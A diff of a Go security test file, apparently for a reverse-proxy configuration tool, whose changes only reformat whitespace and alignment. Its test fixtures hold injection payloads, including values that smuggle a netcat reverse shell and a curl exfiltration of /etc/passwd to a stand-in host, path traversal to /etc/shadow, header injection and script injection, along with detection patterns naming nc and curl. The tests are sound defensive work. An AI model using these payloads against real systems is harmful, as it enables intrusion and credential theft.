@@ -31,17 +31,17 @@ func TestDomainSecurityValidation(t *testing.T) {
 
 		for _, domain := range maliciousDomains {
 			config := HecateBasicConfig{BaseDomain: domain}
-			
+
 			// Domain should be stored as-is but validated when used
 			assert.Equal(t, domain, config.BaseDomain)
-			
+
 			// Check for injection patterns
 			hasInjection := strings.ContainsAny(domain, ";'\"<>&|") ||
 				strings.Contains(domain, "..") ||
 				strings.Contains(domain, "\r") ||
 				strings.Contains(domain, "\n") ||
 				strings.Contains(domain, "${")
-			
+
 			assert.True(t, hasInjection, "Domain should contain injection pattern: %s", domain)
 		}
 	})
@@ -60,7 +60,7 @@ func TestDomainSecurityValidation(t *testing.T) {
 
 		for _, subdomain := range maliciousSubdomains {
 			_ = HecateBasicConfig{Subdomain: subdomain}
-			
+
 			// Check for dangerous patterns
 			isDangerous := strings.ContainsAny(subdomain, ";'\"<>&|{}") ||
 				strings.Contains(subdomain, "..") ||
@@ -68,7 +68,7 @@ func TestDomainSecurityValidation(t *testing.T) {
 				strings.Contains(subdomain, "\n") ||
 				strings.Contains(subdomain, "${") ||
 				strings.Contains(subdomain, "{{")
-			
+
 			assert.True(t, isDangerous, "Subdomain should be flagged as dangerous: %s", subdomain)
 		}
 	})
@@ -84,10 +84,10 @@ func TestDomainSecurityValidation(t *testing.T) {
 
 		for _, domain := range wildcardDomains {
 			_ = HecateBasicConfig{BaseDomain: domain}
-			
+
 			// Check wildcard usage
 			wildcardCount := strings.Count(domain, "*")
-			
+
 			if domain == "*" {
 				assert.Equal(t, 1, wildcardCount, "Dangerous catch-all wildcard")
 			} else if wildcardCount > 1 {
@@ -121,7 +121,7 @@ func TestReverseProxySecurity(t *testing.T) {
 				strings.HasPrefix(upstream, "ftp:") ||
 				strings.Contains(upstream, "169.254.169.254") || // Metadata endpoints
 				strings.ContainsAny(upstream, ";'\"")
-			
+
 			assert.True(t, isDangerous, "Upstream should be flagged as dangerous: %s", upstream)
 		}
 	})
@@ -129,11 +129,11 @@ func TestReverseProxySecurity(t *testing.T) {
 	t.Run("header_injection_security", func(t *testing.T) {
 		// Test header injection security
 		maliciousHeaders := map[string]string{
-			"X-Forwarded-For":    "127.0.0.1\r\nX-Admin: true",
-			"X-Real-IP":          "192.168.1.1\r\n\r\nGET /admin HTTP/1.1",
-			"Host":               "example.com\r\nConnection: close",
-			"X-Custom":           "value\nSet-Cookie: admin=true",
-			"Authorization":      "Bearer token\r\nX-Privileged: yes",
+			"X-Forwarded-For": "127.0.0.1\r\nX-Admin: true",
+			"X-Real-IP":       "192.168.1.1\r\n\r\nGET /admin HTTP/1.1",
+			"Host":            "example.com\r\nConnection: close",
+			"X-Custom":        "value\nSet-Cookie: admin=true",
+			"Authorization":   "Bearer token\r\nX-Privileged: yes",
 		}
 
 		for header, value := range maliciousHeaders {
@@ -155,7 +155,7 @@ func TestReverseProxySecurity(t *testing.T) {
 			// Check for conflicting headers
 			hasContentLength := strings.Contains(pattern, "Content-Length:")
 			hasTransferEncoding := strings.Contains(pattern, "Transfer-Encoding:")
-			
+
 			// Both headers present is a smuggling risk
 			if hasContentLength && hasTransferEncoding {
 				assert.True(t, true, "Detected request smuggling pattern: %s", pattern)
@@ -183,7 +183,7 @@ func TestSSLCertificateSecurity(t *testing.T) {
 				strings.ContainsAny(path, ";|&$") ||
 				strings.Contains(path, "$(") ||
 				!strings.HasSuffix(path, ".pem") && !strings.HasSuffix(path, ".crt") && !strings.HasSuffix(path, ".key")
-			
+
 			assert.True(t, isDangerous, "Path should be flagged as dangerous: %s", path)
 		}
 	})
@@ -191,12 +191,12 @@ func TestSSLCertificateSecurity(t *testing.T) {
 	t.Run("certificate_validation", func(t *testing.T) {
 		// Test certificate validation requirements
 		certRequirements := map[string]bool{
-			"RSA_2048":     true,  // Minimum RSA key size
-			"ECDSA_256":    true,  // Minimum ECDSA key size
-			"SHA256":       true,  // Minimum hash algorithm
-			"RSA_1024":     false, // Too weak
-			"MD5":          false, // Broken hash
-			"SHA1":         false, // Deprecated hash
+			"RSA_2048":  true,  // Minimum RSA key size
+			"ECDSA_256": true,  // Minimum ECDSA key size
+			"SHA256":    true,  // Minimum hash algorithm
+			"RSA_1024":  false, // Too weak
+			"MD5":       false, // Broken hash
+			"SHA1":      false, // Deprecated hash
 		}
 
 		for requirement, shouldAllow := range certRequirements {
@@ -225,18 +225,18 @@ func TestTemplateSecurityValidation(t *testing.T) {
 		for _, tmplStr := range maliciousTemplates {
 			// Attempt to parse template (should succeed)
 			tmpl, err := template.New("test").Parse(tmplStr)
-			
+
 			// Template parsing might succeed, but execution should be controlled
 			if err == nil {
 				assert.NotNil(t, tmpl, "Template parsed but should be executed carefully")
 			}
-			
+
 			// Check for dangerous patterns
 			hasDangerousCall := strings.Contains(tmplStr, ".Exec") ||
 				strings.Contains(tmplStr, ".System") ||
 				strings.Contains(tmplStr, ".Env") ||
 				strings.Contains(tmplStr, "/etc/")
-			
+
 			assert.True(t, hasDangerousCall, "Template should contain dangerous pattern: %s", tmplStr)
 		}
 	})
@@ -244,22 +244,22 @@ func TestTemplateSecurityValidation(t *testing.T) {
 	t.Run("template_data_sanitization", func(t *testing.T) {
 		// Test template data sanitization
 		dangerousData := map[string]interface{}{
-			"domain":     "example.com<script>alert()</script>",
-			"port":       "8080; nc -e /bin/sh evil.com 4444",
-			"backend":    "http://backend:3000 || curl evil.com",
-			"ssl_cert":   "/etc/ssl/../../etc/passwd",
+			"domain":   "example.com<script>alert()</script>",
+			"port":     "8080; nc -e /bin/sh evil.com 4444",
+			"backend":  "http://backend:3000 || curl evil.com",
+			"ssl_cert": "/etc/ssl/../../etc/passwd",
 		}
 
 		for key, value := range dangerousData {
 			// Data should be escaped when rendered
 			valueStr := fmt.Sprintf("%v", value)
-			
+
 			// Check for dangerous content
 			hasDangerousContent := strings.ContainsAny(valueStr, "<>&;|") ||
 				strings.Contains(valueStr, "..") ||
 				strings.Contains(valueStr, "script") ||
 				strings.Contains(valueStr, "curl")
-			
+
 			assert.True(t, hasDangerousContent, "Data for %s should contain dangerous content: %v", key, value)
 		}
 	})
@@ -275,15 +275,15 @@ func TestFileOperationSecurity(t *testing.T) {
 	t.Run("file_permission_security", func(t *testing.T) {
 		// Test file permission security
 		testFiles := []struct {
-			name string
-			perm os.FileMode
+			name   string
+			perm   os.FileMode
 			secure bool
 		}{
-			{"config.yaml", 0644, true},   // Readable by all, writable by owner
-			{"secret.key", 0600, true},    // Only owner can read/write
-			{"public.conf", 0644, true},   // Public config
-			{"private.key", 0666, false},  // Too permissive
-			{"cert.pem", 0777, false},     // Way too permissive
+			{"config.yaml", 0644, true},  // Readable by all, writable by owner
+			{"secret.key", 0600, true},   // Only owner can read/write
+			{"public.conf", 0644, true},  // Public config
+			{"private.key", 0666, false}, // Too permissive
+			{"cert.pem", 0777, false},    // Way too permissive
 		}
 
 		for _, tf := range testFiles {
@@ -295,7 +295,7 @@ func TestFileOperationSecurity(t *testing.T) {
 			require.NoError(t, err)
 
 			actualPerm := info.Mode().Perm()
-			
+
 			if tf.secure {
 				// Secure files should not be world-writable
 				assert.True(t, actualPerm&0002 == 0, "File %s should not be world-writable", tf.name)
@@ -319,18 +319,18 @@ func TestFileOperationSecurity(t *testing.T) {
 
 		for _, malPath := range maliciousPaths {
 			fullPath := filepath.Join(baseDir, malPath)
-			
+
 			// Clean the path to see if it escapes baseDir
 			cleanPath := filepath.Clean(fullPath)
-			
+
 			// Check if path escapes the base directory
 			isEscaping := !strings.HasPrefix(cleanPath, baseDir)
-			
+
 			// Path traversal should be detected
 			if strings.Contains(malPath, "..") {
 				assert.True(t, true, "Path traversal pattern detected: %s", malPath)
 			}
-			
+
 			// Clean path might escape base directory
 			if isEscaping {
 				assert.True(t, true, "Path escapes base directory: %s -> %s", malPath, cleanPath)
@@ -351,17 +351,17 @@ func TestConfigurationInjectionSecurity(t *testing.T) {
 	t.Run("environment_variable_injection", func(t *testing.T) {
 		// Test environment variable injection
 		maliciousEnvVars := map[string]string{
-			"DOMAIN":          "example.com; export ADMIN=true",
-			"BACKEND_IP":      "127.0.0.1 && nc -e /bin/sh evil.com 4444",
-			"PORT":            "8080 || curl http://evil.com?data=$(cat /etc/passwd)",
-			"SSL_CERT_PATH":   "/etc/ssl/certs/../../etc/shadow",
-			"LOG_LEVEL":       "debug; cat /etc/passwd > /tmp/leaked",
+			"DOMAIN":        "example.com; export ADMIN=true",
+			"BACKEND_IP":    "127.0.0.1 && nc -e /bin/sh evil.com 4444",
+			"PORT":          "8080 || curl http://evil.com?data=$(cat /etc/passwd)",
+			"SSL_CERT_PATH": "/etc/ssl/certs/../../etc/shadow",
+			"LOG_LEVEL":     "debug; cat /etc/passwd > /tmp/leaked",
 		}
 
 		env := make(map[string]string)
 		for key, value := range maliciousEnvVars {
 			env[key] = value
-			
+
 			// Check for command injection patterns
 			hasInjection := strings.ContainsAny(value, ";|&$") ||
 				strings.Contains(value, "$(") ||
@@ -369,7 +369,7 @@ func TestConfigurationInjectionSecurity(t *testing.T) {
 				strings.Contains(value, "||") ||
 				strings.Contains(value, "nc ") ||
 				strings.Contains(value, "curl ")
-			
+
 			assert.True(t, hasInjection, "Environment variable %s should contain injection: %s", key, value)
 		}
 	})
@@ -394,7 +394,7 @@ x-anchors:
 				strings.Contains(yaml, "!!ruby") ||
 				strings.Contains(yaml, "curl evil.com") ||
 				strings.Contains(yaml, "rm -rf")
-			
+
 			assert.True(t, hasDangerousPattern, "YAML should contain dangerous pattern")
 		}
 	})
@@ -420,7 +420,7 @@ func TestServiceValidation(t *testing.T) {
 				strings.Contains(name, "\r") ||
 				strings.Contains(name, "\n") ||
 				strings.Contains(name, "${")
-			
+
 			assert.True(t, hasInjection, "Service name should contain injection: %s", name)
 		}
 	})
@@ -442,7 +442,7 @@ func TestServiceValidation(t *testing.T) {
 				strings.Contains(image, "$(") ||
 				strings.Contains(image, "&&") ||
 				strings.Contains(image, "||")
-			
+
 			assert.True(t, isDangerous, "Image name should be flagged as dangerous: %s", image)
 		}
 	})
@@ -450,19 +450,19 @@ func TestServiceValidation(t *testing.T) {
 	t.Run("volume_mount_security", func(t *testing.T) {
 		// Test volume mount security
 		dangerousVolumes := []string{
-			"/:/hostroot",                    // Mounting root
-			"/etc:/host/etc",                 // System config access
+			"/:/hostroot",    // Mounting root
+			"/etc:/host/etc", // System config access
 			"/var/run/docker.sock:/var/run/docker.sock", // Docker socket access
-			"../../:/escaped",                // Path traversal
-			"/proc:/host/proc",               // Process information
-			"/sys:/host/sys",                 // System information
+			"../../:/escaped",  // Path traversal
+			"/proc:/host/proc", // Process information
+			"/sys:/host/sys",   // System information
 		}
 
 		for _, volume := range dangerousVolumes {
 			parts := strings.Split(volume, ":")
 			if len(parts) >= 2 {
 				hostPath := parts[0]
-				
+
 				// Check for dangerous mount points
 				isDangerous := hostPath == "/" ||
 					hostPath == "/etc" ||
@@ -470,7 +470,7 @@ func TestServiceValidation(t *testing.T) {
 					hostPath == "/proc" ||
 					hostPath == "/sys" ||
 					strings.Contains(hostPath, "..")
-				
+
 				assert.True(t, isDangerous, "Volume mount should be flagged as dangerous: %s", volume)
 			}
 		}
@@ -482,7 +482,7 @@ func TestNetworkSecurityValidation(t *testing.T) {
 	t.Run("port_exposure_security", func(t *testing.T) {
 		// Test port exposure security
 		dangerousPorts := []struct {
-			port string
+			port   string
 			reason string
 		}{
 			{"22", "SSH port exposed"},
@@ -505,20 +505,20 @@ func TestNetworkSecurityValidation(t *testing.T) {
 	t.Run("network_policy_validation", func(t *testing.T) {
 		// Test network policy validation
 		insecureNetworkConfigs := []map[string]string{
-			{"bind": "0.0.0.0", "port": "22"},     // SSH on all interfaces
-			{"bind": "0.0.0.0", "port": "3306"},   // MySQL on all interfaces
-			{"bind": "::", "port": "6379"},        // Redis on all IPv6
-			{"bind": "*", "port": "9200"},         // Elasticsearch on all
+			{"bind": "0.0.0.0", "port": "22"},   // SSH on all interfaces
+			{"bind": "0.0.0.0", "port": "3306"}, // MySQL on all interfaces
+			{"bind": "::", "port": "6379"},      // Redis on all IPv6
+			{"bind": "*", "port": "9200"},       // Elasticsearch on all
 		}
 
 		for _, config := range insecureNetworkConfigs {
 			bind := config["bind"]
 			port := config["port"]
-			
+
 			// Check for insecure bindings
 			isInsecure := (bind == "0.0.0.0" || bind == "::" || bind == "*") &&
 				(port == "22" || port == "3306" || port == "6379" || port == "9200")
-			
+
 			assert.True(t, isInsecure, "Network config should be flagged as insecure: %v", config)
 		}
 	})
